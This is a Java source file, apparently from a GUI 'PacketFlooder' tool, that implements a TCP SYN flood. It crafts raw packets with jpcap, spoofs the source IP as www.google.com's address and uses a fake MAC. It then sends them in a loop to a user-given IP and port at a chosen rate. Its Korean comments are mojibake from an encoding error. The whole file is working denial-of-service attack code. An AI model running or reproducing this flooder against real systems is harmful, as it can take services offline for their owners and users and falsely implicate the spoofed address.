package PacketFlooder;

import java.io.IOException;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.HashMap;

import PF_GUI.PF_GUI_NICList;
import PF_GUI.PF_GUI_Resource;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.TCPPacket;

/**
 * 
 * @author Myeong-Un Ryu
 * @version 1.0.0
 * @since 16.11.26
 * TCP Flooder�� ���� ������ ���� ��Ŷ�� �����ϴ� Ŭ����
 * 
 */

public class PF_SendTCP {

	/** NIC **/
	private jpcap.NetworkInterface m_dev;
	
	/** �߽���(������) IP Address **/
	private InetAddress m_src_ip;
	
	/** �߽���(������) MAC Address **/
	private byte[] m_src_mac;
	
	/** SYN Flooding�� ���� ������ �߽���(������) IP Address **/
	private InetAddress m_attack_src_ip;
	
	/** SYN Flooding�� ���� ������ �߽���(������)  MAC Address **/
	private byte[] m_attack_src_mac;
	
	/** SYN Flooding�� ���� ������ �߽���(������) Source port number **/
	private int m_src_port;

	/** SYN Flooding�� ���� SYN �� ���� **/
	private boolean m_isSYN;

	/** SYN Flooding�� ���� Data �� ���� **/
	private byte[] m_data;
	
	
	/** ������(������) IP Address **/
	private InetAddress m_des_ip;
	
	/** ������(������) MAC Address **/
	private byte[] m_des_mac;
	
	/** ������(������) Port number **/
	private int m_des_port;
	
	
	
	/** �ʴ� ������ ��Ŷ�� �� **/
	public int m_pktsNum;
	
	/** ������ ��Ŷ�� �� **/
	public int m_pktsCount;
	
	/** ��Ŷ ������ ���ӵ� �ð� **/
	private int m_seconds;
	
	
	/**
	 * TCP Flooder�� ������ �����ϴ� �޼ҵ� ������ ����̽��� ���� ��쿡�� true�� ����
	 * @return boolean BOOLEANŸŸ������ ���� 
	 * @throws UnknownHostException 
	 * @throws NumberFormatException 
	 * @throws SocketException 
	 */
	public boolean set_PF_SendTCP(String ip, String port, int speed) throws NumberFormatException, UnknownHostException, SocketException 
	{
		
		// Device�� �̸��� ��������
		HashMap<String, NetworkInterface> imsi_map = PF_GUI_NICList.get_PF_GUI_NICList_Instance().m_Map_Device;

		// ���õ� Device�� NPF ������ �������� Device�� �̸����� map���� ã�ƿ´�.
		m_dev = imsi_map.get(PF_GUI_NICList.get_PF_GUI_NICList_Instance().getSelectedValue());
		
		
		if(m_dev!=null) // ������ ����̽��� ���� ��츸 ���� 
		{
			
			// �߽���(������) IP Address ����
			m_src_ip = InetAddress.getLocalHost();

			System.out.println(m_src_ip);
			// �߽���(������) MAC Address
			m_src_mac = java.net.NetworkInterface.getByInetAddress(m_src_ip).getHardwareAddress();
			
			// SYN Flooding�� ���� ������ �߽���(������) IP Address
			m_attack_src_ip = InetAddress.getByName("www.google.com");
			
			// SYN Flooding�� ���� ������ �߽���(������)  MAC Address
			m_attack_src_mac = new byte[]{(byte)0,(byte)1,(byte)2,(byte)3,(byte)4,(byte)5};
			
			// SYN Flooding�� ���� ������ �߽���(������) Source port number
			m_src_port = 12;

			// SYN Flooding�� ���� SYN �� ����
			m_isSYN = true;

			// SYN Flooding�� ���� Data �� ����
			m_data = ("myeonguni.com").getBytes();
			
			
			// ������(������) IP Address
			String[] ipArray = ip.split("\\.");
			m_des_ip = InetAddress.getByAddress(new byte[]{(byte)Integer.parseInt(ipArray[0]),(byte)Integer.parseInt(ipArray[1]),(byte)Integer.parseInt(ipArray[2]),(byte)Integer.parseInt(ipArray[3])});
			
			// ������(������) MAC Address
			// m_des_ip�� ��ȿ�� ���� �ƴ� ��쿡 ���� ����ó���� �ؾ��� ���� ������ ��, �ϴ��� m_src_ip�� ��ü
			m_des_mac = java.net.NetworkInterface.getByInetAddress(m_src_ip).getHardwareAddress();
			
			// ������(������) Port number
			m_des_port = Integer.parseInt(port);
			
			
			// �ʴ� ������ ��Ŷ�� ���� ����
			m_pktsNum = speed;
			
			// ��Ŷ ����
			try {
				send();
			} catch (IOException e) {
				e.printStackTrace();
			}
			
			return true;
		}
		else // ������ ����̽��� ���ٸ� false�� �����Ѵ�.
		{
			return false;
		}

	}// method end
	
	
	/**
	 * TCP Packet�� �����Ͽ� �����ϴ� �޼ҵ�
	 * @param nic ����ڿ� ���� ���õ� Device NPF ����
	 * @throws IOException 
	 */
	public void send() throws IOException {
		
		// ��Ŷ ���� ��ü ����
		JpcapSender sender = JpcapSender.openDevice(m_dev);
		
		/*
		 * 
		 * TCP Packet ���� �� TCP header ���� 
		 * 1) src_port	- Source port number
		 * 2) dst_port	- Destination port number
		 * 3) sequence	- Seqence number
		 * 4) ack_num	- ACK number
		 * 5) urg		- URG flag
		 * 6) ack		- ACK flag
		 * 7) psh		- PSH flag
		 * 8) rst		- RST flag
		 * 9) syn		- SYN flag
		 * 10) fin		- FIN flag
		 * 11) rsv1		- RSV1 flag
		 * 12) rsv2		- RSV2 flag
		 * 13) window	- Window size
		 * 14) urgent	- Urgent pointer
		 * 
		 */
		TCPPacket packet = new TCPPacket(m_src_port,m_des_port,56,78,false,false,false,false,m_isSYN,true,true,true,10,10);
		
		
		/*
		 * 
		 * IP header ����
		 * 1) d_flag	- IP flag bit: [D]elay,
		 * 2) t_flag	- IP flag bit: [T]hrough,
		 * 3) r_flag	- IP flag bit: [R]eliability,
		 * 4) rsv_tos	- Type of Service (TOS),
		 * 5) priority	- Priority,
		 * 6) rsv_frag	- Fragmentation Reservation flag,
		 * 7) dont_frag	- Don't fragment flag,
		 * 8) more_frag	- More fragment flag,
		 * 9) offset	- Offset,
		 * 10) ident	- Identifier,
		 * 11) ttl		- Time To Live,
		 * 12) protocol	- Protocol,
		 * 13) src		- Source IP address,
		 * 14) dst		- Destination IP address
		 * 
		 */
		packet.setIPv4Parameter(0,false,false,false,0,false,false,false,0,1010101,100,IPPacket.IPPROTO_TCP,
				m_attack_src_ip,m_des_ip);
		
		
		/*
		 * Payload ����
		 */
		packet.data = m_data;
		
		
		/*
		 * Ethernet header ����
		 */
		EthernetPacket ether = new EthernetPacket();
		ether.frametype = EthernetPacket.ETHERTYPE_IP;
		ether.src_mac = m_attack_src_mac;
		ether.dst_mac = m_des_mac;
		packet.datalink = ether;

		
		// ���ۿ� ������ ���� ��Ŷ �� �ʱ�ȭ
		m_pktsCount = 0;
		
		/*
		 * ��Ŷ�� �����ϴ� loop
		 */
		for(int i=0; i<m_pktsNum; i++)
		{
			// ��Ŷ ����
			sender.sendPacket(packet);
			
			// ���ۿ� ������ ���� ��Ŷ �� �ǽð� ���
			PF_GUI_Resource.get_Instance().m_lbl_sendPackets.setText(String.valueOf(++m_pktsCount));
		
			// ...
		}
		
	}


}//class end 